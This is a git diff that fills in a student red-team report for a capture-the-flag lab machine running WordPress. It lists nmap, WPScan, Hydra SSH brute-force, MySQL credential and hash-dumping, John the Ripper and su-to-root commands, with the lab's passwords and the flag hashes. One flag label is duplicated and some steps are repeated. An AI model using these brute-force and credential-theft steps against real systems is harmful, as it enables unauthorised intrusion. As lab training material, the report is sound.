@@ -6,40 +6,129 @@
 - Exploitation
 
 ### Exposed Services
-_TODO: Fill out the information below._
 
 Nmap scan results for each machine reveal the below services and OS details:
 
-```bash
-$ nmap ... # TODO: Add command to Scan Target 1
-  # TODO: Insert scan output
-```
+command: $ nmap -sV 192.168.1.110
+
+output:
 
 This scan identifies the services below as potential points of entry:
 - Target 1
-  - List of
-  - Exposed Services
+  Port 22/TCP Open SSH
+  Port 80/TCP Open HTTP
+  Port 111/TCP Open rcpbid
+  Port 139/TCP Open netbios-ssn
+  Port 445/TCP Open netbios-ssn
 
-_TODO: Fill out the list below. Include severity, and CVE numbers, if possible._
-
+ Critical Vulnerabilites
 The following vulnerabilities were identified on each target:
-- Target 1
-  - List of
-  - Critical
-  - Vulnerabilities
 
-_TODO: Include vulnerability scan results to prove the identified vulnerabilities._
+-Target 1
+  User Enumeration (WordPress site)
+  Found the occurrence of simplistic usernames and weak passwords (Hydra Command)
+  Brute forced ssh to gain access into the system.
+  Secure files are not hidden away.
+  Misconfiguration of User Privileges/ Privilege Escalation
+ 
 
 ### Exploitation
-_TODO: Fill out the details below. Include screenshots where possible._
 
 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
 - Target 1
-  - `flag1.txt`: _TODO: Insert `flag1.txt` hash value_
+  - `flag1.txt`: {b9bbcb33e11b80be759c4e844862482d}
+
+
+ 
+
     - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
-  - `flag2.txt`: _TODO: Insert `flag2.txt` hash value_
+•	WPScan to enumerate users on the Target1 WordPress site.
+•	Command: $ wpscan --url 192.168.1.110/wordpress $ wpscan --url 192.168.1.110 --enumerate -u
+ 
+•	Targeting the user michael
+•	Small manual Brute Force attack to guess/finds Michael's password.
+•	First, the user's password is weak and obvious.
+•	Second, for practice, Hydra can be used to crack Michaels's password:
+o	Command: hydra -l michael -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.110 -t 4 ssh  
+•	Capturing Flag1: SSH in as Michael, transvering through directories and files.
+•	The first Flag was found in /var/www/html folder at root in services.html in a HTML comment below the footer.
+o	Commands:
+	ssh michael@192.168.1.110
+	password: michael
+	cd /var/www/html
+	ls -l
+	nano services.html
+
+
+
+
+
+ - `flag2.txt`: {fc3fd5Bdcdad9ab23facac6e9a365e581c33}
+
+ 
+
     - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+
+  The same exploit used to gain flag1.
+    
+  •	Capturing Flag2: While in SSH in as Michael, Flag2 was also gained.
+o	Once again, browsing through the files and directories, Flag2 can be found in /var/www next to the html folder where Flag1 was found.
+o	Commands:
+	ssh michael@192.168.1.110
+	password: michael
+	cd /var/www
+	ls 
+	cat flag2.txt
+
+
+- `flag3.txt`: {afc01ab56b50591e7dccf93122770cd23}
+
+
+ 
+
+Exploit Used:
+
+•	Same exploits to gain Flag1 and Flag2.
+•	Capturing Flag3: Access the MYSQL database.
+o	Discovering the wp-config.php and gaining access to the database credentials as the user Michael, MYSQL when used to explore the database.
+•	Commands:
+o	mysql -u root -p 
+o	Enter password: R@v3nSecurity
+o	show databases;
+o	Show tables
+o	select * from wp_posts;
+
+ 
+
+- `flag3.txt`: {715dea6c055b9fe3337544932F2941ce}
+
+ 
+
+Exploit Used:
+
+•	Unsalted password hash and use of the privilege escalation with Python.
+•	Capture Flag4: Gained user credentials, cracked password with John the Ripper and used Python to gain root privileges.
+•	Once gaining access to the database credentials as the user Michael from the wp-config.php file, the next step was to lift the username and password hasses using MYSQL.
+•	The credentials were located in the wp_users table in the wordpress database. The usernames and passwords were copied and saved on the Kali machine in a file call wp_hashes.txt.
+o	Commands:
+o	mysql -u root -p 
+o	Enter password: R@v3nSecurity
+o	show databases;
+o	Show tables
+o	select * from wp_posts;
+•	On the Kali machine the wp_hashes.txt ran against John the Ripper to crack the hashes.
+•	Command: - john wp_hashes.txt
+
+ 
+
+•	Once the user Steven's password hash was cracked, the next step was to SSH into the server as Steven. Under the user Steven, privileges will first be checked, and escalated to root by guessing common root passwords.
+o	Commands:
+	ssh steven@192.168.1.110
+	password: pink:84
+	sudo -l
+	su root
+	password: toor
+	find /-iname flag*
+	cat /root/flag4.txt
+
+ 
